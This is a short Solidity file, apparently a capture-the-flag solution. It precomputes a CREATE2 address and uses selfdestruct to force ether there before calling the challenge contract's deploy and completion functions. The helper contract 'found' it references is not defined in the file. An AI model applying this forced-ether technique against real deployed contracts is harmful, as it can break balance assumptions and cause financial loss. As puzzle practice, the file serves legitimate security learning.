pragma solidity ^0.8.0;

interface Icheck{
    function depoly(bytes32 _salt) external returns(address);
    function isCompleted() external;
}

contract solve{
    constructor() public payable{}
    
    function getAddressAndSend(bytes32 _salt,address addr) public {
        require(address(this).balance >= 0.001 ether);
        bytes memory bytecode = type(found).creationCode;
        bytes32 hash = keccak256(
        abi.encodePacked(
            bytes1(0xff),
            addr,
            _salt,
            keccak256(bytecode)
        )
    );
        address _add = address(uint160(uint256(hash)));
        selfdestruct(payable(_add));
        
    }
}

//传入salt  工厂合约的地址就可以
contract foundattack{
    
    bytes32 public salt;
    address public target;

    constructor(bytes32 _salt,address _target) public payable{
        salt = _salt;
        target = _target;
    }

    function attack() public payable{
        solve add1 = new solve{value: 0.001 ether}();
        add1.getAddressAndSend(salt,target);
        Icheck(target).depoly(salt);
        Icheck(target).isCompleted();

    }
}
